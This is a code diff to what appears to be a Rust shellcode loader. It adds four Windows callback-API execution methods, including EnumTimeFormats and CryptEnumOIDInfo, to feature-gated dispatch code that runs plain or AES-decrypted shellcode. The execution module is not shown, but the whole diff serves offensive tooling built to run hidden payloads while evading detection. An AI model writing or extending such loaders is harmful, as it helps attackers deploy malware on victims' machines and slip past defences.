@@ -5,7 +5,7 @@ use std::ffi::c_void;
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 use std::env;
 
-#[cfg(any(feature = "ShellcodeExecuteDefault", feature = "ShellcodeExecuteFiber", feature = "ShellcodeExecuteCreateTimerQueueTimer", feature = "ShellcodeExecuteEnumUILanguages", feature = "ShellcodeExecuteVerifierEnumerate", feature = "ShellcodeExecuteEnumChildWindows", feature = "ShellcodeExecuteEnumDesktopWindows", feature = "ShellcodeExecuteEnumSystemLocales", feature = "ShellcodeExecuteCertEnumSystemStoreLocation", feature = "ShellcodeExecuteEnumWindowStations", feature = "ShellcodeExecuteEnumDisplayMonitors", feature = "ShellcodeExecuteImageGetDigestStream"))]
+#[cfg(any(feature = "ShellcodeExecuteDefault", feature = "ShellcodeExecuteFiber", feature = "ShellcodeExecuteCreateTimerQueueTimer", feature = "ShellcodeExecuteEnumUILanguages", feature = "ShellcodeExecuteVerifierEnumerate", feature = "ShellcodeExecuteEnumChildWindows", feature = "ShellcodeExecuteEnumDesktopWindows", feature = "ShellcodeExecuteEnumSystemLocales", feature = "ShellcodeExecuteCertEnumSystemStoreLocation", feature = "ShellcodeExecuteEnumWindowStations", feature = "ShellcodeExecuteEnumDisplayMonitors", feature = "ShellcodeExecuteImageGetDigestStream", feature = "ShellcodeExecuteCertEnumSystemStore", feature = "ShellcodeExecuteEnumTimeFormats", feature = "ShellcodeExecuteCryptEnumOIDInfo", feature = "ShellcodeExecuteImmEnumInputContext"))]
 mod execution;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
@@ -166,6 +166,18 @@ fn main() {
             
             #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
             execution::shellcode_execute_imagegetdigeststream(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+            execution::shellcode_execute_certenumsystemstore(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+            execution::shellcode_execute_enumtimeformats(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+            execution::shellcode_execute_cryptenumoidinfo(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+            execution::shellcode_execute_immenuminputcontext(shellcode);
         }
 
         // Execute shellcode with AES decryption
@@ -208,6 +220,18 @@ fn main() {
                 
                 #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
                 execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+                execution::shellcode_execute_certenumsystemstore(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+                execution::shellcode_execute_enumtimeformats(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+                execution::shellcode_execute_cryptenumoidinfo(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+                execution::shellcode_execute_immenuminputcontext(decrypted_shellcode);
             }
         }
 }
